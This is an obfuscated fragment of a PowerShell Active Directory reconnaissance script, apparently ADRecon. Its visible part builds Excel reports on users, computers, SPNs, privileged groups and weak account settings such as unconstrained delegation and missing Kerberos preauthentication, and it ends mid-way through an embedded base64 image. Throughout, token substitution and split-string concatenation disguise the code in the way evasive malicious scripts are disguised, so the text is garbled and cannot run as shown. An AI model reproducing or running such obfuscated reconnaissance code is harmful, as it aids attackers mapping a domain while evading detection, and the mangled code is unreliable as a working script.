        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4LAPS.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjLAPSlEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4ComputerSPNs.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjComputer SPNslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName lEzjUserNamelEzj
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Computers.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjComputerslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName lEzjUserNamelEzj

            bLHworksheet = bLHworkbook.Worksheets.Item(1)
            # Freeze First Row and Column
            bLHworksheet.Select()
            bLHworksheet.Application.ActiveWindow.splitcolumn = 1
            bLHworksheet.Application.ActiveWindow.splitrow = 1
            bLHworksheet.Application.ActiveWindow.FreezePanes = bLHtrue

            Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
            Remove-Variable worksheet
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4OUs.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjOUslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Groups.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjGroupslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName lEzjDistinguishedNamelEzj
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4GroupMembers.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjGroup MemberslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Rem'+'ove-Variable ADFileName

            Get-ADRExcelSort -ColumnName lEzjGroup NamelEzj
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4UserSPNs.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjUser SPNslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName
        }

        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Users.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjUserslEzj
            Get-ADRExcelImport -ADFileName bLHADFileName
            Remove-Variable ADFileName

            Get-ADRExcelSort -ColumnName lEzjUserNamelEzj

            bLHworksheet = bLHworkbook.Worksheets.Item(1)

            # Freeze First Row and Column
            bLHworksheet.Select()
            bLHworksheet.Application.ActiveWindow.splitcolumn = 1
            bLHworksheet.Application.ActiveWindow.splitrow = 1
            bLHworksheet.Application.ActiveWindow.FreezePanes = bLHtrue

            bLHworksheet.Cells.Item(1,3).Interior.ColorIndex = 5
            bLHworksheet.Cells.Item(1,3).font.ColorIndex = 2
            # Set Filter to Enabled Accounts only
            bLHworksheet.UsedRange.Select() 0Ogv Out-Null
            bLHexcel.Selection.AutoFilter(3,bLHtrue) 0Ogv Out-Null
            bLHworksheet.Cells.Item(1,1).Select() 0Ogv Out-Null
            Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
            Remove-Variable worksheet
        }

        # Computer Role Stats
        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4ComputerSPNs.csvxfJ4)
        If (Test-Pa'+'th bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjComputer Role StatslEzj
            Remove-Variable ADFileName

            bLHworksheet = bLHworkbook.Worksheets.Item(1)
            bLHPivotTableName = lEzjComputer SPNslEzj
            Get-ADRExcelPivotTable -SrcSheetName lEzj'+'Computer SPNslEzj -PivotTableName bLHPivotTableName -PivotRows @(lEzjServicelEzj) -PivotValues @(lEzjServicelEzj)

            bLHworksheet.Cells.Item(1,1) = lEzjComputer RolelEzj
            bLHworksheet.Cells.Item(1,2) = lEzjCountlEzj

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            bLHworksheet.PivotTables(bLHPivotTableName).PivotFields(lEzjServicelEzj).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,lEzjCountlEzj)

            Get-ADRExcelChart -ChartType lEzjxlColumnClusteredlEzj -ChartLayout 10 -ChartTitle lEzjComputer Roles in ADlEzj -RangetoCover lEzjD2:U16lEzj
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(1,4) , lEzjlEzj , lEzjxfJ4Computer SPNsxfJ4!A1lEzj, lEzjlEzj, lEzjRaw DatalEzj) 0Ogv Out-Null
            bLHexcel.Windows.Item(1).Displaygridlines = bLHfalse
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
            Remove-Variable worksheet
        }

        # Operating System Stats
        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Computers.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjOperating System StatslEzj
            Remove-Variable ADFileName

            bLHworksheet = bLHworkbook.Worksheets.Item(1)
            bLHPivotTableName = lEzjOperating SystemslEzj
            Get-ADRExcelPivotTable -SrcSheetName lEzjComputerslEzj -PivotTableName bLHPivotTableName -PivotRows @(lEzjOperating SystemlEzj) -PivotValues @(lEzjOperating SystemlEzj)

            bLHworksheet.Cells.Item(1,1) = lEzjOperating SystemlEzj
            bLHworksheet.Cells.Item(1,2) = lEzjCountlEzj

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            bLHworksheet.PivotTables(bLHPivotTableName).Pi'+'votFields(lEzjOperating SystemlEzj).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,lEzjCountlEzj)

            Get-ADRExcelChart -ChartType lEzjxlColumnClusteredlEzj -ChartLayout 10 -ChartTitle lEzjOperating Systems in ADlEzj -RangetoCover lEzjD2:S16lEzj
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(1,4) , lEzjlEzj , lEzjComputers!A1lEzj, lEzjlEzj, lEzjRaw DatalEzj) 0Ogv Out-Null
            bLHexcel.Windows.Item(1).Displaygridlines = bLHfalse
            Remove-Variable PivotTableName

            Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
            Remove-Variable worksheet
        }

        # Group Stats
        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4GroupMembers.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjPrivileged G'+'roup StatslEzj
            Remove-Variable ADFileName

            bLHworksheet = bLHworkbook.Worksheets.Item(1)
            bLHPivotTableName = lEzjGroup MemberslEzj
            Get-ADRExcelPivotTable -SrcSheetName lEzjGroup MemberslEzj -PivotTableName bLHPivotTableName -PivotRows @(lEzjGroup NamelEzj)-PivotFilters @(lEzjAccountTypelEzj) -PivotValues @(lEzjAccountTypelEzj)

            # Set the filter
            bLHworksheet.PivotTables(bLHPivotTableName).PivotFields(lEzjAccountTypelEzj).CurrentPage = lEzjuserlEzj

            bLHworksheet.Cells.Item(1,2).Interior.ColorIndex = 5
            bLHworksheet.Cells.Item(1,2).font.ColorIndex = 2

            bLHworksheet.Cells.Item(3,1) = lEzjGroup NamelEzj
            bLHworksheet.Cells.Item(3,2) = lEzjCount (Not-Recursive)lEzj

            bLHexcel.ScreenUpdating = bLHfalse
            # Create a copy of the Pivot Table
            bLHPivotTableTemp = (bLHworkbook.PivotCaches().Item(bLHworkbook.PivotCaches().Count)).CreatePivotTable(lEzjR1C5lEzj,lEzjPivotTableTemplEzj)
            bLHPivotFieldTemp = bLHPivotTableTemp.PivotFields(lEzjGroup NamelEzj)
            # Set a filter
            bLHPivotFieldTemp.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
            Try
            {
                bLHPivotFieldTemp.CurrentPage = lEzjDomain AdminslEzj
            }
     '+'       Catch
            {
                # No Direct Domain Admins. Good Job!
                bLHNoDA = bLHtrue
            }
            If (bLHNoDA)
            {
                Try
                {
                    bLHPivotFieldTemp.CurrentPage = lEzjAdministratorslEzj
                }
                Catch
                {
              '+'      # No Direct Administrators
                }
            }
            # Create a Slicer
            bLHPivotSlicer = bLHworkbook.SlicerCaches.Add(bLHPivotTableTemp,bLHPivotFieldTemp)
            # Add Original Pivot Table to the Slicer
            bLHPivotSlicer.PivotTables.AddPivotTable(bLHworksheet.PivotTables(bL'+'HPivotTableName))
            # Delete the Slicer
            bLHPivotSlicer.Delete()
            # Delete the Pivot Table Copy
            bLHPivotTableTemp.TableRange2.Delete() 0Ogv Out-Null

            Get-ADRExcelComObjRelease -ComObjtoRelease bLHPivotFieldTemp
            Get-ADRExcelComObjRelease -ComObjtoRelease bLHPivotSlicer
            Get-ADRExcelComObjRelease -ComObjtoRelease bLHPivotTableTemp

            Remove-Variable PivotFieldTemp
            Remove-Variable PivotSlicer
            Remove-Variable PivotTableTemp

            lEzjAccount OperatorslEzj,lEzjAdministratorslEzj,lEzjBackup OperatorslEzj,lEzjCert PublisherslEzj,lEzjCrypto OperatorslEzj,lEzjDnsAdminslEzj,lEzjDomain AdminslEzj,lEzjEnterprise AdminslEzj,lEzjEnterprise Key AdminslEzj,lEzjIncoming Forest Trust BuilderslEzj,lEzjKey AdminslEzj,lEzjMicrosoft Advanced Threat Analytics AdministratorslEzj,lEzjNetwork OperatorslEzj,lEzjPrint OperatorslEzj,lEzjProtected UserslEzj,lEzjRemote Desktop UserslEzj,lEzjSchema AdminslEzj,lEzjServer OperatorslEzj 0Ogv ForEach-Object {
                Try
                {
                    bLHworksheet.PivotTables(bLHPivotTableName).PivotFields(lEzjGroup NamelEzj).PivotItems(bLH_).Visible = bLHtrue
                }
                Catch
                {
                    # when PivotItem is not found
                }
            }

            # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
            bLHworksheet.PivotTables(bLHPivotTableName).PivotFields(lEzjGroup NamelEzj).AutoSort([Microsoft.Office.Interop.Excel.XlSortOrder]::xlDescending,lEzjCount (Not-Recursive)lEzj)

            bLHworksheet.Cells.Item(3,1).Interior.ColorIndex = 5
            bLHworksheet.Cells.Item(3,1).font.ColorIndex = 2

            bLHexcel.ScreenUpdating = bLHtrue

            Get-ADRExcelChart -ChartType lEzjxlColumnClusteredlEzj -ChartLayout 10 -ChartTitle lEzjPrivileged Groups in ADlEzj -RangetoCover lEzjD2:P16lEzj -StartRow lEzjA3lEzj -StartColumn lEzjB3lEzj
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(1,4) , lEzjlEzj , lEzjxfJ4Group MembersxfJ4!A1lEzj, lEzjlEzj, lEzjRaw DatalEzj) 0Ogv Out-Null
            bLHexcel.Windows.Item(1).Displaygridlines = bLHfalse

            Get-ADRExcelComObjRelease -ComObjtoRelease bLHworksheet
            Remove-Variable worksheet
        }

        # Computer Stats
        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Computers.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjComputer StatslEzj
            Remove-Variable ADFileName

            bLHObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            bLHObjAttributes.Add(lEzjDelegation TyplEzj,xfJ4lEzjUnconstrainedlEzjxfJ4)
            bLHObjAttributes.Add(lEzjDelegation TypelEzj,xfJ4lEzjConstrainedlEzjxfJ4)
            bLHObjAttributes.Add(lEzjSIDHistorylEzj,xfJ4lEzj*lEzjxfJ4)
            bLHObjAttributes.Add(lEzjDormantlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjPassword Age (> lEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjms-ds-CreatorSidlEzj,xfJ4lEzj*lEzjxfJ4)

            Get-ADRExcelAttributeStats -SrcSheetName lEzjComputerslEzj -Title1 lEzjComputer Accounts in ADlEzj -PivotTableName lEzjComputer Accounts StatuslEzj -PivotRows lEzjEnabledlEzj -PivotValues lEzjUserNamelEzj -PivotPercentage lEzjUserNamelEzj -Title2 lEzjStatus of Computer AccountslEzj -ObjAttributes bLHObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType lEzjxlPielEzj -ChartLayout 3 -ChartTitle lEzjComputer Accounts in ADlEzj -RangetoCover lEzjA11:D23lEzj -ChartData bLHworkbook.Worksheets.Item(1).Range(lEzjA3:A4,B3:B4lEzj)
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(10,1) , lEzjlEzj , lEzjComputers!A1lEzj, lEzjlEzj, lEzjRaw DatalEzj) 0Ogv Out-Null

            Get-ADRExcelChart -ChartType lEzjxlBarClusteredlEzj -ChartLayout 1 -ChartTitle lEzjStatus of Computer AccountslEzj -RangetoCover lEzjF11:L23lEzj -ChartData bLHworkbook.Worksheets.Item(1).Range(lEzjF2:F8,G2:G8lEzj)
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(10,6) , lEzjlEzj , lEzjComputers!A1lEzj, lEzjlEzj, lEzjRaw DatalEzj) 0Ogv Out-Null

            bLHworkbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() 0Ogv Out-Null
            bLHexcel.Windows.Item(1).Displaygridline'+'s = bLHfalse
        }

        # User Stats
        bLHADFileName = -join(bLHReportPath,xfJ4cnIxfJ4,xfJ4Users.csvxfJ4)
        If (Test-Path bLHADFileName)
        {
            Get-ADRExcelWorkbook -Name lEzjUser StatslEzj
            Remove-Variable ADFileName

            bLHObjAttributes = New-Object System.Collections.Specialized.OrderedDictionary
            bLHObjAttributes.Add(lEzjMust Change Password at LogonlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjCannot Change PasswordlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjPassword Never ExpireslEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjReversible Password EncryptionlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjSmartcard Logon RequiredlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjDelegation PermittedlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjKerberos DES OnlylEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjKerberos RC4lEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjDoes Not Require Pre AuthlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjPassword Age (> lEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjAccount Locked OutlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjNever Logged inlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjDormantlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjPassword Not RequiredlEzj,xfJ4lEzjTRUElEzjxfJ4)
            bLHObjAttributes.Add(lEzjDelegation TyplEzj,xfJ4lEzjUnconstrainedlEzjxfJ4)
            bLHObjAttributes.Add(lEzjSIDHistorylEzj,xfJ4lEzj*lEzjxfJ4)

            Get-ADRExcelAttributeStats -SrcSheetName lEzjUserslEzj -Title1 lEzjUser Accounts in ADlEzj -PivotTableName lEzjUser Accounts StatuslEzj -PivotRows lEzjEnabledlEzj -PivotValues lEzjUserNamelEzj -PivotPercentage lEzjUserNamelEzj -Title2 lEzjStatus of User AccountslEzj -ObjAttributes bLHObjAttributes
            Remove-Variable ObjAttributes

            Get-ADRExcelChart -ChartType lEzjxlPielEzj -ChartLayout 3 -ChartTitle lEzjUser Accounts in ADlEzj -RangetoCover lEzjA21:D33lEzj -ChartData bLHworkbook.Worksheets.Item(1).Range(lEzjA3:A4,B3:B4lEzj)
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(20,1) , lEzjlEzj , lEzjUsers!A1lEzj, lEzjlEzj, lEzjRaw DatalEzj) 0Ogv Out-Null

            Get-ADRExcelChart -ChartType lEzjxlBarClusteredlEzj -ChartLayout 1 -ChartTitle lEzjStatus of User AccountslEzj -RangetoCover lEzjF21:L43lEzj -ChartData bLHworkbook.Worksheets.Item(1).Range(lEzjF2:F18,G2:G18lEzj)
            bLHworkbook.Worksheets.Item(1).Hyperlinks.Add(bLHworkbook.Worksheets.Item(1).Cells.Item(20,6) , lEzjlEzj , lEzjUsers!A1lEzj, lEzjlEzj, lEzjRaw DatalEzj) 0Ogv Out-Null

            bLHworkbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() 0Ogv Out-Null
            bLHexcel.Windows.Item(1).Displaygridlines = bLHfalse
        }

        # Create Table of Contents
        Get-ADRExcelWorkbook -Name lEzjTable of ContentslEzj
        bLHworksheet = bLHworkbook.Worksheets.Item(1)

        bLHexcel.ScreenUpdating = bLHfalse
        # Image format and properties
        # bLHpath = lEzjC:cnIADRecon_Logo.jpglEzj
        # bLHbase64adrecon = [convert]::ToBase64String((Get-Content bLHpath -Encoding byte))

		bLHbase64adrecon = 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